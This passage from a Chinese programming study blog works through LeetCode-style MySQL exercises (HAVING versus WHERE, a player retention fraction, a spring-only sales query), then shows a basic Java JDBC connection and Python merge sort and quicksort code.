class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221103211036661.png" alt="image-20221103211036661"></p>
<p>主要是<code>having</code>的知识点</p>
<p>参考：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/caibaotimes/p/13722165.html" >mysql having和where的区别 - caibaotimes - 博客园 (cnblogs.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><strong>where：</strong></p>
<ul>
<li>是作用在查询结果进行分组之前，过滤掉不符合条件的数据。</li>
<li>where中不能包含聚合函数。（注意是：where后面子句不能有聚合函数，而在含有where中可以使用聚合函数）</li>
<li>作用在group by和having字句前</li>
<li>是作用于对表与视图</li>
</ul>
<p><strong>having：</strong></p>
<ul>
<li>是作用在查询结果分组之后，筛选满足条件的组，过滤掉数据。</li>
<li>通常跟聚合函数一起使用。</li>
<li>having子句在聚合后对组记录进行筛选。</li>
<li>是作用于分组</li>
</ul>
<p>其实就是<code>group by</code>的时候用到<code>having</code>来进行分组后的条件筛选，而不能用<code>where</code>，<code>where</code>是分组之前使用</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> actor_id,director_id</span><br><span class="line"><span class="keyword">FROM</span> ActorDirector</span><br><span class="line"><span class="keyword">GROUP</span> <span class="keyword">BY</span> ActorDirector.actor_id,ActorDirector.director_id</span><br><span class="line"><span class="keyword">HAVING</span> <span class="built_in">COUNT</span>(ActorDirector.director_id)<span class="operator">&gt;=</span> <span class="number">3</span></span><br></pre></td></tr></table></div></figure>

<p>或者先计数然制表，然后再查询也行</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> actor_id,director_id </span><br><span class="line"><span class="keyword">FROM</span>(</span><br><span class="line">	<span class="keyword">SELECT</span> actor_id,director_id,<span class="built_in">COUNT</span>(director_id) <span class="keyword">AS</span> cnt</span><br><span class="line">	<span class="keyword">FROM</span> ActorDirector</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> ActorDirector.actor_id,ActorDirector.director_id</span><br><span class="line">) cntTable</span><br><span class="line"><span class="keyword">WHERE</span> cntTable.cnt <span class="operator">&gt;=</span> <span class="number">3</span> </span><br></pre></td></tr></table></div></figure>




        <h2 id="游戏玩法分析-IV"   >
          <a href="#游戏玩法分析-IV" class="heading-link"><i class="fas fa-link"></i></a><a href="#游戏玩法分析-IV" class="headerlink" title="游戏玩法分析 IV"></a>游戏玩法分析 IV</h2>
      <p>创建语句</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Activity (player_id <span class="type">int</span>, device_id <span class="type">int</span>, event_date <span class="type">date</span>, games_played <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Activity;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-01&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;6&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2017-06-25&#x27;</span>, <span class="string">&#x27;1&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2016-03-02&#x27;</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Activity (player_id, device_id, event_date, games_played) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2018-07-03&#x27;</span>, <span class="string">&#x27;5&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105326813.png" alt="image-20221104105326813"></p>

        <h3 id="知识点：-5"   >
          <a href="#知识点：-5" class="heading-link"><i class="fas fa-link"></i></a><a href="#知识点：-5" class="headerlink" title="知识点："></a>知识点：</h3>
      
        <h4 id="Date数据类型及函数："   >
          <a href="#Date数据类型及函数：" class="heading-link"><i class="fas fa-link"></i></a><a href="#Date数据类型及函数：" class="headerlink" title="Date数据类型及函数："></a><code>Date</code>数据类型及函数：</h4>
      <p><code>mysql</code>支持<code>date</code>日期数据类型以及为其创建了一个<code>DATE</code>函数，用法如下</p>
<ul>
<li><p>正常情况查询</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105904188.png" alt="image-20221104105904188"></p>
</li>
<li><p>进行日期加减查询</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105921938.png" alt="image-20221104105921938"></p>
</li>
<li><p>加入<code>DATE</code>函数</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104105954814.png" alt="image-20221104105954814"></p>
</li>
</ul>

        <h4 id="保留小数CONVERT："   >
          <a href="#保留小数CONVERT：" class="heading-link"><i class="fas fa-link"></i></a><a href="#保留小数CONVERT：" class="headerlink" title="保留小数CONVERT："></a>保留小数CONVERT：</h4>
      <p>可以使用<code>CONVERT</code>或者<code>TRUNCATE</code>来对除法进行保留小数</p>
<ul>
<li><p><code>CONVERT(a/b,DECIMAL(10,2))</code></p>
<p>代表<code>a/b</code>以10精度计算，保留2位小数，这个精度也算是小数点后几位，存在四舍五入</p>
</li>
<li><p><code>TRUNCATE(a/b,2)</code></p>
<p>代表<code>a/b</code>保留2位小数，但是没有四舍五入</p>
</li>
</ul>

        <h3 id="解析："   >
          <a href="#解析：" class="heading-link"><i class="fas fa-link"></i></a><a href="#解析：" class="headerlink" title="解析："></a>解析：</h3>
      <ul>
<li><p>首先确定所有人首次登录的第二天</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后判断第二天是否在<code>activity</code>表格中，并且计数，这个即代表在首次登录的第二天的所有人总和。</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> activity </span><br><span class="line"><span class="keyword">WHERE</span> (player_id, event_date) <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id)</span><br></pre></td></tr></table></div></figure></li>
<li><p>之后再将所有人计算总和，然后计算除法即可</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">CONVERT</span>(top.cnt<span class="operator">/</span>down.cnt,<span class="type">DECIMAL</span>(<span class="number">10</span>,<span class="number">2</span>)) fraction </span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> activity </span><br><span class="line"><span class="keyword">WHERE</span> (player_id, event_date) <span class="keyword">IN</span></span><br><span class="line">	(<span class="keyword">SELECT</span> player_id, <span class="type">DATE</span>(<span class="built_in">MIN</span>(event_date) <span class="operator">+</span> <span class="number">1</span>) event_date</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id)) top,</span><br><span class="line"></span><br><span class="line">(<span class="keyword">SELECT</span> <span class="built_in">COUNT</span>(<span class="operator">*</span>) <span class="keyword">AS</span> cnt</span><br><span class="line"><span class="keyword">FROM</span> (<span class="keyword">SELECT</span> player_id</span><br><span class="line">	<span class="keyword">FROM</span> activity</span><br><span class="line">	<span class="keyword">GROUP</span> <span class="keyword">BY</span> player_id) player_cnt) down</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="销售分析III"   >
          <a href="#销售分析III" class="heading-link"><i class="fas fa-link"></i></a><a href="#销售分析III" class="headerlink" title="销售分析III"></a>销售分析III</h2>
      <p>创建语句：</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Product (product_id <span class="type">int</span>, product_name <span class="type">varchar</span>(<span class="number">10</span>), unit_price <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Create</span> <span class="keyword">table</span> If <span class="keyword">Not</span> <span class="keyword">Exists</span> Sales (seller_id <span class="type">int</span>, product_id <span class="type">int</span>, buyer_id <span class="type">int</span>, sale_date <span class="type">date</span>, quantity <span class="type">int</span>, price <span class="type">int</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Product;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;S8&#x27;</span>, <span class="string">&#x27;1000&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;G4&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Product (product_id, product_name, unit_price) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;iPhone&#x27;</span>, <span class="string">&#x27;1400&#x27;</span>);</span><br><span class="line"><span class="keyword">Truncate</span> <span class="keyword">table</span> Sales;</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2019-01-21&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2000&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2019-02-17&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;2019-06-02&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;800&#x27;</span>);</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> Sales (seller_id, product_id, buyer_id, sale_date, quantity, price) <span class="keyword">values</span> (<span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;2019-05-13&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;2800&#x27;</span>);</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221104163658566.png" alt="image-20221104163658566"></p>
<p>依次获得相关子表</p>
<ul>
<li><p>在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_id</span><br><span class="line"><span class="keyword">FROM</span> Sales</span><br><span class="line"><span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>不在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> product_id</span><br><span class="line"><span class="keyword">FROM</span> Sales</span><br><span class="line"><span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span></span><br></pre></td></tr></table></div></figure></li>
<li><p>确保在春季销售的产品中没有不在春季销售的所有产品</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> testOne.product_id</span><br><span class="line">	<span class="keyword">FROM</span></span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>) testOne</span><br><span class="line">	<span class="keyword">WHERE</span> testOne.product_id <span class="keyword">NOT</span> <span class="keyword">IN</span> </span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>)</span><br></pre></td></tr></table></div></figure></li>
<li><p>然后依据<code>product_id</code>查询在<code>Product</code>表中查询</p>
<figure class="highlight sql"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> idTable.product_id,product.product_name</span><br><span class="line"><span class="keyword">FROM</span> </span><br><span class="line">(<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> testOne.product_id</span><br><span class="line">	<span class="keyword">FROM</span></span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>) testOne</span><br><span class="line">	<span class="keyword">WHERE</span> testOne.product_id <span class="keyword">NOT</span> <span class="keyword">IN</span> </span><br><span class="line">	(<span class="keyword">SELECT</span> product_id</span><br><span class="line">		<span class="keyword">FROM</span> Sales</span><br><span class="line">		<span class="keyword">WHERE</span> sale_date <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="string">&#x27;2019-01-01&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2019-03-31&#x27;</span>))idTable,</span><br><span class="line">Product</span><br><span class="line"><span class="keyword">WHERE</span> idTable.product_id <span class="operator">=</span> product.`product_id`</span><br></pre></td></tr></table></div></figure></li>
</ul>

        <h2 id="JAVA连接"   >
          <a href="#JAVA连接" class="heading-link"><i class="fas fa-link"></i></a><a href="#JAVA连接" class="headerlink" title="JAVA连接"></a>JAVA连接</h2>
      <figure class="highlight java"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String URL = <span class="string">&quot;jdbc:mysql://localhost:3306&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String USER = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> String PASSWORD = <span class="string">&quot;123456&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//1.加载驱动程序</span></span><br><span class="line">        Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">        <span class="comment">//2. 获得数据库连接</span></span><br><span class="line">        Connection conn = DriverManager.getConnection(URL, USER, PASSWORD);</span><br><span class="line">        <span class="comment">//3.操作数据库，实现增删改查</span></span><br><span class="line">        Statement stmt = conn.createStatement();</span><br><span class="line">        stmt.executeQuery(<span class="string">&quot;use mytest&quot;</span>);</span><br><span class="line">        ResultSet rs = stmt.executeQuery(<span class="string">&quot;SELECT sName, sAge FROM Student&quot;</span>);</span><br><span class="line">        <span class="comment">//如果有数据，rs.next()返回true</span></span><br><span class="line">        <span class="keyword">while</span>(rs.next())&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Name:&quot;</span> + rs.getString(<span class="string">&quot;sName&quot;</span>)+<span class="string">&quot; Age:&quot;</span>+rs.getInt(<span class="string">&quot;sAge&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>

<p>加载驱动程序需要进行下载相关<code>jar</code>包，然后导入，</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160118066.png" alt="image-20221028160118066"></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028160210079.png" alt="image-20221028160210079"></p>
<p>参考</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.runoob.com/java/java-mysql-connect.html" >Java MySQL 连接 | 菜鸟教程 (runoob.com)</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_26525215/article/details/53239123" >(47条消息) 【IDEA】向IntelliJ IDEA创建的项目导入Jar包的两种方式_谙忆的博客-CSDN博客_idea如何添加jar包</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>其中<code>rs.next()</code>相当于跳过表头，逐行打印则需要循环<code>rs.next()</code>，结果为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155818686.png" alt="image-20221028155818686"></p>
<p>对应表中数据</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20221028155853564.png" alt="image-20221028155853564"></p>

        <h1 id="基础排序"   >
          <a href="#基础排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#基础排序" class="headerlink" title="基础排序"></a>基础排序</h1>
      
        <h2 id="归并排序"   >
          <a href="#归并排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h2>
      <p>主要是分治思想，从大往下分，然后再合并</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">List</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">merge</span>(<span class="params">self, nums, mid, l, r</span>):</span></span><br><span class="line">        <span class="comment"># 归并两个有序数组</span></span><br><span class="line">        tmp = []</span><br><span class="line">        i,j = l,mid+<span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> (i &lt;= mid <span class="keyword">or</span> j &lt;= r):</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &lt;= nums[j]):</span><br><span class="line">                tmp.append(nums[i])</span><br><span class="line">                i += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (i == mid + <span class="number">1</span>):</span><br><span class="line">                    tmp += nums[j:r + <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                tmp.append(nums[j])</span><br><span class="line">                j += <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span> (j == r + <span class="number">1</span>):</span><br><span class="line">                    tmp += nums[i:mid + <span class="number">1</span>]</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">        nums[l:r + <span class="number">1</span>] = tmp</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">mergeSort</span>(<span class="params">self, nums, l, r</span>):</span></span><br><span class="line">        <span class="keyword">if</span> (l &gt;= r):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#先划分</span></span><br><span class="line">        mid = <span class="built_in">int</span>((l + r) / <span class="number">2</span>)</span><br><span class="line">        self.mergeSort(nums, l, mid)</span><br><span class="line">        self.mergeSort(nums, mid + <span class="number">1</span>, r)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#再治</span></span><br><span class="line">        self.merge(nums, mid, l, r)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums: <span class="type">List</span>[<span class="built_in">int</span>]</span>) -&gt; <span class="type">List</span>[<span class="built_in">int</span>]:</span></span><br><span class="line">        self.mergeSort(nums, <span class="number">0</span>, <span class="built_in">len</span>(nums) - <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> nums</span><br></pre></td></tr></table></div></figure>




        <h2 id="快速排序"   >
          <a href="#快速排序" class="heading-link"><i class="fas fa-link"></i></a><a href="#快速排序" class="headerlink" title="快速排序"></a>快速排序</h2>
      <p>也是分治思想，双指针，参考<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://leetcode.cn/problems/sort-an-array/solution/duo-chong-pai-xu-yi-wang-da-jin-kuai-pai-wgz4/" >『 3种排序一网打尽 』 快速排序、归并排序、堆排序详解 - 排序数组 - 力扣（LeetCode）</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/1652980493-wDmBKe-quick_sort.png" alt="1652980493-wDmBKe-quick_sort"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">partition</span>(<span class="params">self, nums, low, high</span>):</span></span><br><span class="line">        pivot_idx = random.randint(low,high)</span><br><span class="line">        pivot = nums[pivot_idx]</span><br><span class="line">        nums[low],nums[pivot_idx] = nums[pivot_idx],nums[low]</span><br><span class="line">        left = low</span><br><span class="line">        right = high</span><br><span class="line">        <span class="keyword">while</span> left &lt; right:</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[right] &gt;= pivot):</span><br><span class="line">                right -= <span class="number">1</span></span><br><span class="line">            nums[left] = nums[right]</span><br><span class="line">            <span class="keyword">while</span>(left &lt; right <span class="keyword">and</span> nums[left] &lt;= pivot):</span><br><span class="line">                left += <span class="number">1</span></span><br><span class="line">            nums[right] = nums[left]</span><br><span class="line">        nums[left] = pivot</span><br><span class="line">        <span class="keyword">return</span> left</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">quickSort</span>(<span class="params">self, nums,low,high</span>):</span></span><br><span class="line">        <span class="keyword">if</span>(low &gt;= high):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="comment">#先划分</span></span><br><span class="line">        mid = self.partition(nums,low,high)</span><br><span class="line">        </span><br><span class="line">        <span class="comment">#再治</span></span><br><span class="line">        self.quickSort(nums,low,mid-<span class="number">1</span>)</span><br><span class="line">        self.quickSort(nums,mid+<span class="number">1</span>,high)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sortArray</span>(<span class="params">self, nums: <span 